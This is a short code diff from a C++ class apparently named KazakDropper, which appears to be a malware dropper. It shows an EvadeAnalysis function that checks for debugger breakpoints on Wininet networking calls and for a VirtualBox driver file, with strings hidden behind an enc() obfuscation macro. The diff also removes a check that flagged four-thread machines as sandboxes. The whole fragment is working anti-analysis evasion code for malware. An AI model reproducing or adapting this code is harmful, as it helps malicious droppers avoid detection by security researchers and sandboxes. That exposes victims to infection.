@@ -39,8 +39,6 @@ BOOL KazakDropper::IsBp(const char* lpszModule, const char* lpszFunction)
 
 bool KazakDropper::EvadeAnalysis()
 {
-	int iNumberOfThreads = std::thread::hardware_concurrency();
-
 	if (KazakDropper::IsBp(enc("Wininet.dll"), enc("InternetOpenA")) || KazakDropper::IsBp(enc("Wininet.dll"), enc("InternetOpenUrl")) || KazakDropper::IsBp(enc("Wininet.dll"), enc("InternetReadFile")) || KazakDropper::IsBp(enc("Wininet.dll"), enc("InternetCloseHandle")) || KazakDropper::IsBp(enc("Wininet.dll"), enc("InternetCheckConnectionA")))
 		return TRUE;
 
@@ -51,9 +49,6 @@ bool KazakDropper::EvadeAnalysis()
 		return TRUE;
 
 	else if (std::filesystem::exists(enc("C:\\Windows\\System32\\vboxdisp.dll")))
-		return TRUE;
-
-	else if (iNumberOfThreads == 4)
 		return TRUE;
 
 }
